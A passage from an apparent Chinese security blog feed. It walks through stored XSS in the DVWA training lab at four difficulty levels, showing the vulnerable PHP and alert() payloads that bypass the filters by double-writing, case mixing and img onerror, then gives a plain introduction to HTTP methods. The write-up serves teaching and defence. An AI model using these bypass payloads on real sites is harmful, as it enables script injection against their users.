id="XSS-Stored-Low"><a href="#XSS-Stored-Low" class="headerlink" title="XSS(Stored) Low"></a>XSS(Stored) Low</h3><h4 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] ); </span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] ); </span><br><span class="line">    <span class="comment">// Sanitize message input </span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="comment">// Sanitize name input </span></span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> ); </span><br><span class="line">    <span class="comment">// Update database </span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> ); </span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>针对代码中提到的几个函数解释一下</p><ol><li>trim(string,charlist) 功能：移除字符串两侧的空白字符或者其他预定义字符(<code>\t \n \x0B \r  </code>)，可选参数charlist支持增添额外需要删除的字符</li><li>Mysql_real_escape_string(string,connection)这个函数在 <a href="%5Bhttp://nizeyu.xyz/2020/03/28/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E5%9B%9B%E3%80%81SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87/%5D(http://nizeyu.xyz/2020/03/28/%5BWeb%E5%AE%89%E5%85%A8%5D%E5%9B%9B%E3%80%81SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87/)">SQL注入防御绕过</a>曾经提到过。功能：对字符串中的特殊符号（<code>\x00 \n \r \ &#39; &quot; \x1a</code>）进行转义。</li><li>stripslahes(string) 功能：删除字符串中的反斜杠</li></ol><p>从源代码可以看出对输入没有做XSS方面的过滤与检查就直接存储至数据库了，因此存在明显的存储型XSS漏洞。</p><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>直接输入<code>&lt;script&gt;alert(/nzy/)&lt;/script&gt;</code>，需要注意的是name变量在前端中对字数有限制，我们将其修改至30。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdmpktc9o3j30xo05sdgl.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdmpktc9o3j30xo05sdgl.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200408220418246"></p><h3 id="XSS-Stored-Medium"><a href="#XSS-Stored-Medium" class="headerlink" title="XSS(Stored) Medium"></a>XSS(Stored) Medium</h3><h4 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] ); </span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] ); </span><br><span class="line">    <span class="comment">// Sanitize message input </span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) ); </span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="comment">// Sanitize name input </span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> ); </span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> ); </span><br><span class="line">    <span class="comment">// Update database </span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> ); </span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>针对代码中提到的几个函数解释一下</p><ol><li>Strip_tags() 功能：删除字符串中的HTML、XML以及PHP标签，但保留<code>&lt;b&gt;</code>标签。</li><li>addslashes() 功能：在字符串中出现预定字符（<code>&#39; &quot; / NULL</code>）之前添加反斜杠的字符串。</li></ol><p>从源代码可以看出对输入中的message参数使用了htmlspecialchars()函数进行标签转换，因此无法再通过message参数进行XSS注入，但是对name参数只进行形如XSS(Reflected) Medium中的过滤<code>&lt;script&gt;</code>字符串而已，因此存在存储型XSS漏洞。</p><h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>基本参见XSS(Reflected) Medium中的双写绕过、大小写混淆绕过两种办法，并且对name参数进行修改maxlength=30。</p><ol><li>双写绕过，输入<code>&lt;scr&lt;script&gt;ipt&gt;alert(/nzy/)&lt;/script&gt;</code></li><li>大小写混淆绕过，输入<code>&lt;Script&gt;alert(/nzy/)&lt;/scirpt&gt;</code></li></ol><h3 id="XSS-Stored-High"><a href="#XSS-Stored-High" class="headerlink" title="XSS(Stored) High"></a>XSS(Stored) High</h3><h4 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] ); </span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] ); </span><br><span class="line">    <span class="comment">// Sanitize message input </span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) ); </span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="comment">// Sanitize name input </span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> ); </span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> ); </span><br><span class="line">    <span class="comment">// Update database </span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> ); </span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源代码可以看出这道题类似于XSS(Reflected) High，具体参见上文。</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>基本参见XSS(Reflected) High中的利用img、body等标签事件或者iframe等标签src来注入恶意的JS代码的办法，并且对name参数进行修改maxlength=30。</p><p>输入<code>&lt;img src=1 onerror=alert(/nzy/)&gt;</code></p><h3 id="XSS-Stored-Impossible"><a href="#XSS-Stored-Impossible" class="headerlink" title="XSS(Stored) Impossible"></a>XSS(Stored) Impossible</h3><h4 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] ); </span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] ); </span><br><span class="line">    <span class="comment">// Sanitize message input </span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="comment">// Sanitize name input </span></span><br><span class="line">    <span class="variable">$name</span> = stripslashes( <span class="variable">$name</span> ); </span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> ); </span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$name</span> ); </span><br><span class="line">    <span class="comment">// Update database </span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> ); </span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::PARAM_STR ); </span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::PARAM_STR ); </span><br><span class="line">    <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是终极函数htmlspecialchars()函数的出场，解决XSS问题。有一点需要注意的是，如果htmlspecialchars()函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。</p><p>htmlspecialchars()完整用法：<a href="https://www.runoob.com/php/func-string-htmlspecialchars.html">https://www.runoob.com/php/func-string-htmlspecialchars.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议简介</title>
      <link href="2020/04/07/HTTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B/"/>
      <url>2020/04/07/HTTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>本文学习如何HTTP如何在客户端与服务器端通信，以及HTTP方法。</p><a id="more"></a><h2 id="HTTP协议在客户端和服务端之间的通信"><a href="#HTTP协议在客户端和服务端之间的通信" class="headerlink" title="HTTP协议在客户端和服务端之间的通信"></a>HTTP协议在客户端和服务端之间的通信</h2><p><strong>客户端</strong>：请求访问文本或图像等资源的一端。<br><strong>服务器端</strong>：提供资源响应的一端。</p><blockquote><p>注意：就一条通信路线来说，服务器端和客户端的角色是确定的，而用HTTP协议能够明确区分哪端是客户端，哪端是服务器端。</p></blockquote><h2 id="通过请求和响应的交换达成通信"><a href="#通过请求和响应的交换达成通信" class="headerlink" title="通过请求和响应的交换达成通信"></a>通过请求和响应的交换达成通信</h2><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d1h9e3j30xc0d63zr.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d1h9e3j30xc0d63zr.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1"></p><p>过程：<em>请求从客户端出发，最后服务器端响应该请求并返回。</em></p><blockquote><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d56pjlj30r803yt94.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d56pjlj30r803yt94.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2"></p><p><code>GET</code>:请求访问服务的类型 ；</p><p><code>/index.htm</code>:请求访问的资源对象；</p><p><code>HTTP/1.1</code>：HTTP的版本号，用来提示客户端使用的HTTP协议功能；</p><p>请求访问hackr.jp主机的/index.htm页面资源。</p></blockquote><blockquote><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d8q22rj30vc09ydgt.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d8q22rj30vc09ydgt.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3"></p><p><code>HTTP/1.1</code>:HTTP版本号</p><p><code>200</code>:状态码(status code)</p><p><code>Date</code>:创建响应的日期时间</p><p><code>&lt;html&gt;...&lt;/html&gt;</code>:资源实体的主体</p></blockquote><h2 id="HTTP是不保存状态的协议"><a href="#HTTP是不保存状态的协议" class="headerlink" title="HTTP是不保存状态的协议"></a>HTTP是不保存状态的协议</h2><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d42jurj30vc09ydgt.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d42jurj30vc09ydgt.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="4"></p><blockquote><p>为了更快的处理大量事物，确保协议的可伸缩性，协议本身并不保留之前一切的请求或响应报文的信息。</p></blockquote><p><strong>Cookie</strong>：可记录状态，后面会讲到。</p><h2 id="告知服务器意图的HTTP方法"><a href="#告知服务器意图的HTTP方法" class="headerlink" title="告知服务器意图的HTTP方法"></a>告知服务器意图的HTTP方法</h2><h5><center>[1] GET 获取资源</center></h5><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d330vvj30v40bimxo.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d330vvj30v40bimxo.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="5"></p><blockquote><p>GET方法用来请求访问已被URI识别的资源。指定的资源经服务器端解析后返回相应内容。</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d63oyxj30we074jrz.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d63oyxj30we074jrz.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20191106200523055"></p><h5><center>[2] POST 传输实体主体</center></h5><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d7e5gwj30vy0biwf2.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d7e5gwj30vy0biwf2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="6"></p><blockquote><p>POST与GET都可以用来传输实体的主体。但POST的主要目的并不是获取相应的主体内容。</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d8979mj30wc0820tj.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d8979mj30wc0820tj.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="7"></p><h5><center>[3] PUT 传输文件</center></h5><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d261buj30vy0bq74v.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d261buj30vy0bq74v.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="8"></p><blockquote><p>PUT方法用来传输文件。在请求报文的主体中包含文件内容，然后保存到请求URI指定的位置。</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d7tl8dj30x2096q3y.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d7tl8dj30x2096q3y.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="9"></p><h5><center>[4] HEAD 获得报文首部</center></h5><blockquote><p>HEAD方法和GET方法一样，知识不返回报文主体部分。用于确认URI的有效性及资源更新的日期时间等。</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d5e262j30y407kjs0.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d5e262j30y407kjs0.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="10"></p><h5><center>[5] DELETE 删除文件</center></h5><blockquote><p>DELETE方法按请求URI删除指定的资源。</p></blockquote><h5><center>[6] OPTIONS 询问支持的方法</center></h5><blockquote><p>OPTIONS方法用来查询针对请求URI指定的资源支持的方法。</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d3m98kj30wq09eab1.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d3m98kj30wq09eab1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="11"></p><h5><center>[7] TRACE 追踪路径</center></h5><blockquote><p>TRACE方法是让Web服务器端将之前的请求通信环回给客户端的方法。</p><p>发送请求时，在Max-Forwards首部字段中填入数值，每经过一个服务器端就将该数字减1，当数值刚好减到0时，就停止继续传输。</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d4jewaj30xm0eajsn.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d4jewaj30xm0eajsn.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="12"></p><h5><center>[8] CONNECT 要求用隧道协议连接代理</center></h5><blockquote><p>CONNECT方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信。主要使用SSL和TSL协议把通信内容加密后经网络隧道传输。</p><p>CONNECT格式：<code>CONNECT 代理服务器名:端口号 HTTP版本</code></p></blockquote><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d2lsvqj30x407e74y.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d2lsvqj30x407e74y.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="13"></p><h2 id="使用方法下达命令"><a href="#使用方法下达命令" class="headerlink" title="使用方法下达命令"></a>使用方法下达命令</h2><p><strong>方法的命令</strong>：向请求URI指定的资源发送请求报文</p><h5><center>HTTP/1.0和HTTP/1.1支持的方法</center></h5><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d1o53hj30va0g2ac6.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d1o53hj30va0g2ac6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="14"></p><h2 id="持久接连节省通信量"><a href="#持久接连节省通信量" class="headerlink" title="持久接连节省通信量"></a>持久接连节省通信量</h2><blockquote><p>在HTTP协议的初始版本中，每进行一次HTTP通信就要断开一次TCP连接。</p><p>但是在之后，一个HTML页面包含图片使得通信量剧集增加。</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d6uvo2j30go0m6gmv.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdl9d6uvo2j30go0m6gmv.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="15"></p><p><strong>持久连接</strong>：只要任意一端没有明确提出断开连接，则保持TCP连接状态。</p>]]></content>
      
      
      <categories>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLMAP不完全使用手册</title>
      <link href="2020/03/30/SQLMAP%E4%B8%8D%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"/>
      <url>2020/03/30/SQLMAP%E4%B8%8D%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</url>
      
